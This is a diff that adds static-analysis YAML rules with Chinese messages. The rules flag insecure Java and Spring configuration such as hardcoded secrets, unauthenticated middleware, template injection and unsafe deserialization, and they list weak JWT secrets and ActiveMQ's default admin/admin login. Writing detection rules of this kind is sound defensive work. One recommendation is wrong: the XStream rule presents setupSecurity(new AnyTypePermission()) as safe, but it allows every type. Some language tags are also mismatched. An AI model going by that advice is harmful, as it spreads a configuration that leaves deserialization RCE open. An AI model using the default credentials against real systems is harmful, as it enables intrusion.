+    message: "检测到 Spring Cloud Gateway 路由配置。请检查路由配置是否存在注入风险，如 ${} 表达式注入。建议避免从用户输入构建路由。"
+    severity: INFO
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-94"
+
+  # ============================================
+  # P1 - 组件配置安全 - Zuul
+  # ============================================
+  
+  - id: java-config-zuul-routes-expose
+    patterns:
+      - pattern-regex: 'zuul\.routes\.|zuul\.ignored-services'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Zuul 路由配置。Zuul 默认暴露所有服务，建议配置 zuul.ignored-services=* 并显式定义 zuul.routes。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  # ============================================
+  # P1 - 组件配置安全 - Consul
+  # ============================================
+  
+  - id: java-config-consul-no-auth
+    patterns:
+      - pattern-regex: 'spring\.cloud\.consul\.(host|port|discovery\.enabled)'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Consul 配置。Consul 默认无认证，攻击者可获取服务注册信息。建议配置 ACL token：spring.cloud.consul.discovery.acl-token"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  - id: java-config-consul-token-plaintext
+    patterns:
+      - pattern-regex: 'consul\.(token|acl-token)\s*[=:]\s*[^$\{]'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Consul Token 明文配置。建议使用环境变量：spring.cloud.consul.discovery.acl-token=VAR_CONSUL_TOKEN"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P1 - 组件配置安全 - Zookeeper
+  # ============================================
+  
+  - id: java-config-zookeeper-no-auth
+    patterns:
+      - pattern-regex: 'zookeeper\.(connect|address)|curator\.connect'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Zookeeper 配置。Zookeeper 默认无认证，建议启用 ACL 认证。Dubbo/Zookeeper 未授权访问可能导致服务被恶意注册/注销。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  # ============================================
+  # P1 - 组件配置安全 - RocketMQ
+  # ============================================
+  
+  - id: java-config-rocketmq-namesrv-expose
+    patterns:
+      - pattern-regex: 'rocketmq\.name-server|rocketmq\.namesrv\.addr'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 RocketMQ NameServer 配置。RocketMQ NameServer 默认无认证，攻击者可获取 Topic 和 Broker 信息。建议限制内网访问。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  # ============================================
+  # P1 - 组件配置安全 - ActiveMQ
+  # ============================================
+  
+  - id: java-config-activemq-console-expose
+    patterns:
+      - pattern-regex: 'activemq\.broker-url|spring\.activemq\.broker-url'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 ActiveMQ 配置。ActiveMQ Console 默认端口 8161，默认密码 admin/admin。建议修改默认密码并限制访问。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P1 - 组件配置安全 - MinIO/OSS
+  # ============================================
+  
+  - id: java-config-minio-credentials
+    patterns:
+      - pattern-regex: 'minio\.(accessKey|secretKey|access-key|secret-key)\s*[=:]\s*[^$\{]'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 MinIO AccessKey/SecretKey 明文配置。建议使用环境变量：minio.access-key=VAR_MINIO_ACCESS_KEY"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  - id: java-config-oss-credentials
+    patterns:
+      - pattern-regex: 'aliyun\.oss\.(accessKeyId|accessKeySecret)|aws\.(accessKeyId|secretKey)'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 OSS/AWS AccessKey 明文配置。建议使用环境变量或 IAM 角色。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P1 - 组件配置安全 - JWT
+  # ============================================
+  
+  - id: java-config-jwt-secret-hardcoded
+    patterns:
+      - pattern-regex: 'jwt\.(secret|key|signing-key)\s*[=:]\s*[^$\{][a-zA-Z0-9]{10,}'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+        - "*.java"
+    message: "检测到 JWT Secret 硬编码。JWT Secret 泄露可导致任意用户身份伪造。建议使用环境变量或密钥管理服务。"
+    severity: ERROR
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  - id: java-config-jwt-weak-secret
+    patterns:
+      - pattern-regex: 'jwt\.secret\s*[=:]\s*(secret|password|123456|admin|key|test)'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到弱 JWT Secret。弱密钥可被暴力破解，导致身份伪造。建议使用 256 位以上的强随机密钥。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  - id: java-config-jjwt-hardcoded
+    patterns:
+      - pattern-regex: 'Jwts\.(builder|parserBuilder)\(\)\.signWith\s*\(\s*"[^"]+"\s*\)'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 JJWT 硬编码密钥。请使用安全的方式存储和加载密钥。"
+    severity: ERROR
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P1 - 组件配置安全 - OAuth2
+  # ============================================
+  
+  - id: java-config-oauth2-client-secret-hardcoded
+    patterns:
+      - pattern-regex: 'oauth2\.client\.(secret|client-secret)\s*[=:]\s*[^$\{]|spring\.security\.oauth2\.client\.registration\.[^.]+\.client-secret\s*[=:]\s*[^$\{]'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 OAuth2 Client Secret 明文配置。建议使用环境变量：client-secret=VAR_OAUTH2_CLIENT_SECRET"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P1 - 组件配置安全 - GraphQL
+  # ============================================
+  
+  - id: java-config-graphql-introspection
+    patterns:
+      - pattern-regex: 'graphql\.servlet\.introspection-enabled\s*[=:]\s*true|spring\.graphql\.graphiql\.enabled\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 GraphQL Introspection/GraphiQL 开启。生产环境应禁用，可能泄露 Schema 信息。建议设置 enabled=false。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  # ============================================
+  # P1 - 组件配置安全 - gRPC
+  # ============================================
+  
+  - id: java-config-grpc-plaintext
+    patterns:
+      - pattern-regex: 'grpc\.(client|server)\.security\s*[=:]\s*false|grpc\.server\.plaintext\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 gRPC 明文传输配置。建议启用 TLS 加密通信。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-319"
+
+  # ============================================
+  # P1 - 组件配置安全 - WebFlux
+  # ============================================
+  
+  - id: java-config-webflux-cors-open
+    patterns:
+      - pattern-regex: 'allowedOrigins\s*[=:]\s*\*|allowedOriginPatterns\s*[=:]\s*\*'
+    paths:
+      include:
+        - "*.java"
+        - "*.yml"
+        - "*.yaml"
+    message: "检测到 WebFlux CORS 配置允许所有来源。生产环境应限制允许的域名，防止跨站请求伪造。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-942"
+
+  # ============================================
+  # P1 - 组件配置安全 - Memcached
+  # ============================================
+  
+  - id: java-config-memcached-no-auth
+    patterns:
+      - pattern-regex: 'memcached\.(servers|hosts)|xmemcached\.servers'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Memcached 配置。Memcached 默认无认证，建议限制内网访问或使用 SASL 认证。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  # ============================================
+  # P1 - 组件配置安全 - Solr
+  # ============================================
+  
+  - id: java-config-solr-no-auth
+    patterns:
+      - pattern-regex: 'spring\.data\.solr\.host|solr\.host'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Solr 配置。Solr 默认无认证，CVE-2019-0192/0193 可能导致 RCE。建议启用认证并限制访问。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  # ============================================
+  # P1 - 组件配置安全 - Velocity
+  # ============================================
+  
+  - id: java-config-velocity-sandbox-disabled
+    patterns:
+      - pattern-regex: 'velocimacro\.permissions\.allow\.inline|runtime\.references\.strict'
+    paths:
+      include:
+        - "*.properties"
+        - "*.java"
+    message: "检测到 Velocity 配置。Velocity 模板引擎可能导致 SSTI 漏洞。建议启用沙箱模式或使用白名单。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-94"
+
+  # ============================================
+  # P1 - 组件配置安全 - FreeMarker
+  # ============================================
+  
+  - id: java-config-freemarker-sandbox-disabled
+    patterns:
+      - pattern-regex: 'Configuration\(\)|freemarker\.template\.Configuration'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 FreeMarker 配置。FreeMarker 模板引擎可能导致 SSTI 漏洞。建议使用 Configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-94"
+
+  # ============================================
+  # P1 - 组件配置安全 - Thymeleaf
+  # ============================================
+  
+  - id: java-config-thymeleaf-ssrf-ssti
+    patterns:
+      - pattern-regex: '@GetMapping.*return\s*"[^"]*"\s*;|ModelAndView\("[^"]*"\)'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 Thymeleaf 模板返回。如果模板名称由用户输入控制，可能导致 SSTI 漏洞。建议避免动态模板名称。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-94"
+
+  # ============================================
+  # P1 - 组件配置安全 - Drools
+  # ============================================
+  
+  - id: java-config-drools-rule-injection
+    patterns:
+      - pattern-regex: 'KieSession|Drools\.|RuleEngine|kie\.container'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 Drools 规则引擎配置。如果规则内容由用户输入，可能导致代码注入。建议使用规则白名单或沙箱执行。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-94"
+
+  # ============================================
+  # P1 - 组件配置安全 - Activiti/Flowable
+  # ============================================
+  
+  - id: java-config-activiti-xml-external
+    patterns:
+      - pattern-regex: 'ProcessEngine|activiti\.|flowable\.'
+    paths:
+      include:
+        - "*.java"
+        - "*.xml"
+    message: "检测到 Activiti/Flowable 工作流配置。BPMN XML 可能包含外部实体引用，存在 XXE 风险。建议禁用外部实体解析。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-611"
+
+  # ============================================
+  # P1 - 组件配置安全 - SnakeYAML
+  # ============================================
+  
+  - id: java-config-snakeyaml-safe-load
+    patterns:
+      - pattern-regex: 'new Yaml\(\)|Yaml\(\)\.load'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 SnakeYAML 配置。Yaml.load() 可能导致反序列化 RCE。建议使用 SafeConstructor：new Yaml(new SafeConstructor())"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  # ============================================
+  # P1 - 组件配置安全 - XStream
+  # ============================================
+  
+  - id: java-config-xstream-allow-all
+    patterns:
+      - pattern-regex: 'XStream\(\)|xstream\.alias|xstream\.ignoreUnknownElements'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 XStream 配置。XStream 默认允许任意类反序列化，可能导致 RCE。建议使用安全初始化：xstream.setupSecurity(new AnyTypePermission());"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  # ============================================
+  # P1 - 组件配置安全 - Hessian
+  # ============================================
+  
+  - id: java-config-hessian-factory
+    patterns:
+      - pattern-regex: 'HessianProxyFactory|HessianSkeleton|HessianInput'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 Hessian 配置。Hessian 反序列化可能导致 RCE，如 Apache Dubbo Hessian 反序列化漏洞。建议升级版本或启用白名单。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  # ============================================
+  # P1 - 组件配置安全 - JDBC Attack
+  # ============================================
+  
+  - id: java-config-jdbc-url-injection
+    patterns:
+      - pattern-regex: "DriverManager.getConnection\\s*\\("
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 JDBC URL 动态构建。可能导致 JDBC Attack (MySQL fake server、PostgreSQL logger 等)。建议使用参数化配置。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-918"
+
+  - id: java-config-h2-console-expose
+    patterns:
+      - pattern-regex: 'spring\.h2\.console\.enabled\s*[=:]\s*true|h2\.console'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 H2 Console 开启。H2 Console 可能导致 RCE (JNDI 注入)，生产环境应禁用。建议设置 enabled=false。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  # ============================================
+  # P2 - 组件配置安全 - Rate Limiting
+  # ============================================
+  
+  - id: java-config-rate-limit-missing
+    patterns:
+      - pattern-regex: '@RequestMapping|@GetMapping|@PostMapping|@RestController'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 REST 接口定义。建议配置 API 限流，防止 DoS 攻击。可使用 Bucket4j、Resilience4j 或 Sentinel。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-400"
+
+  # ============================================
+  # P2 - 组件配置安全 - @InitBinder
+  # ============================================
+  
+  - id: java-config-initbinder-empty-disallow
+    patterns:
+      - pattern-regex: 'setDisallowedFields\s*\(\s*new\s+String\[\]\s*\{\s*\}\s*\)'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到危险的 @InitBinder 配置：setDisallowedFields(new String[]{})。该配置显式禁用 Spring 字段过滤机制。若存在参数绑定接口（@ModelAttribute 或无注解对象参数），可能导致批量分配漏洞或 Spring4Shell (CVE-2022-22965)。建议删除此配置或添加危险字段过滤。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-915"
+      references:
+        - https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
+        - https://spring.io/security/cve-2022-22965
+
+  - id: java-config-initbinder-missing-class-filter
+    patterns:
+      - pattern-regex: '@InitBinder'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 @InitBinder 配置。建议检查是否禁用了危险字段：class.*, module.*, *.class.* 等。若配置 setDisallowedFields(new String[]{}) 则完全禁用防护，存在风险。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-15"
+
+  # ============================================
+  # P1 - Jakarta EE 支持 (Spring Boot 3.x)
+  # ============================================
+  
+  - id: java-config-jakarta-servlet-filter
+    patterns:
+      - pattern-regex: 'jakarta\.servlet\.|implements\s+(jakarta\.)?Filter|extends\s+(jakarta\.)?HttpServlet'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Jakarta EE Servlet/Filter 实现。Jakarta EE 9+ 使用 jakarta.* 命名空间（Spring Boot 3.x）。请确保安全配置正确。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-284"
+
+  - id: java-config-jakarta-websocket
+    patterns:
+      - pattern-regex: 'jakarta\.websocket\.|@ServerEndpoint|@ClientEndpoint'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Jakarta WebSocket 端点。WebSocket 端点可能存在认证绕过或输入验证问题。建议检查握手阶段的认证逻辑。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-287"
+
+  # ============================================
+  # P1 - Spring Security 6.x 新语法规则
+  # ============================================
+  
+  - id: java-config-springsecurity6-requestMatchers-permitAll
+    patterns:
+      - pattern-regex: 'requestMatchers\s*\(\s*"[^"]+"\s*\)\s*\.\s*permitAll|requestMatchers\s*\(\s*AntPathRequestMatcher|requestMatchers\s*\(\s*MvcRequestMatcher'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security 6.x requestMatchers permitAll 配置。requestMatchers 替代了 antMatchers/mvcMatchers。请确认该路径是否需要公开访问。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-284"
+
+  - id: java-config-springsecurity6-authorizeHttpRequests-anyRequest
+    patterns:
+      - pattern-regex: 'anyRequest\s*\(\s*\)\s*\.\s*(permitAll|anonymous)'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security 6.x anyRequest().permitAll() 或 anyRequest().anonymous()。这会放行所有未匹配的请求，可能导致认证绕过。建议使用 anyRequest().authenticated()。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-287"
+
+  - id: java-config-springsecurity6-securityMatcher
+    patterns:
+      - pattern-regex: 'securityMatcher\s*\(\s*"[^"]+"\s*\)'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security 6.x securityMatcher 配置。用于 SecurityFilterChain 的请求匹配。请确保匹配规则正确配置。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-287"
+
+  - id: java-config-springsecurity6-deprecated-antMatchers
+    patterns:
+      - pattern-regex: 'antMatchers\s*\(|mvcMatchers\s\('
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到已弃用的 antMatchers/mvcMatchers。Spring Security 6.x 建议使用 requestMatchers() 替代。antMatchers 在 6.1+ 已标记为 deprecated。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-477"
+
+  # ============================================
+  # P1 - Fastjson 2.x 规则
+  # ============================================
+  
+  - id: java-config-fastjson2-autotype-enabled
+    patterns:
+      - pattern-regex: 'JSONReader\.Feature\.SupportAutoType|ParserConfig\.getGlobalInstance\(\)\.setAutoTypeSupport\(true\)|fastjson2.*AutoType'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Fastjson 2.x AutoType 开启。Fastjson 2.x 包名改为 com.alibaba.fastjson2，同样存在反序列化 RCE 风险。建议使用 safeMode。"
+    severity: ERROR
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  - id: java-config-fastjson2-version-vulnerable
+    patterns:
+      - pattern-regex: 'fastjson2[^>]*<version>\s*2\.0\.([0-9]|[1-3][0-9]|4[0-6])\.'
+    paths:
+      include:
+        - "pom.xml"
+        - "*.gradle"
+    message: "检测到 Fastjson 2.x 受影响版本 (< 2.0.47)。存在反序列化 RCE 漏洞风险。建议升级到 2.0.47+ 或最新版本。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  # ============================================
+  # P1 - Kotlin 协程安全规则
+  # ============================================
+  
+  - id: java-config-kotlin-coroutine-globalscope
+    patterns:
+      - pattern-regex: 'GlobalScope\.(launch|async)'
+    paths:
+      include:
+        - "*.kt"
+    message: "检测到 GlobalScope 使用。GlobalScope 生命周期与应用相同，可能导致内存泄漏和未控制的并发。建议使用 lifecycleScope、viewModelScope 或自定义 CoroutineScope。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-401"
+
+  - id: java-config-kotlin-coroutine-runBlocking
+    patterns:
+      - pattern-regex: 'runBlocking\s*\{'
+    paths:
+      include:
+        - "*.kt"
+    message: "检测到 runBlocking 使用。runBlocking 会阻塞当前线程，在协程中使用可能导致死锁。建议使用 suspend 函数或 withContext。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-400"
+
+  - id: java-config-kotlin-coroutine-dispatcher-IO
+    patterns:
+      - pattern-regex: 'withContext\(Dispatchers\.IO\)|Dispatchers\.IO'
+    paths:
+      include:
+        - "*.kt"
+    message: "检测到 Dispatchers.IO 使用。IO 调度器适用于阻塞操作，但过度使用可能导致线程池耗尽。建议合理评估并发需求。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-400"
+
+  - id: java-config-kotlin-inject-constructor
+    patterns:
+      - pattern-regex: '@Inject\s+constructor|@Singleton\s+class'
+    paths:
+      include:
+        - "*.kt"
+    message: "检测到 Kotlin 依赖注入。请确保注入的依赖是线程安全的，特别是对于单例组件。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-362"
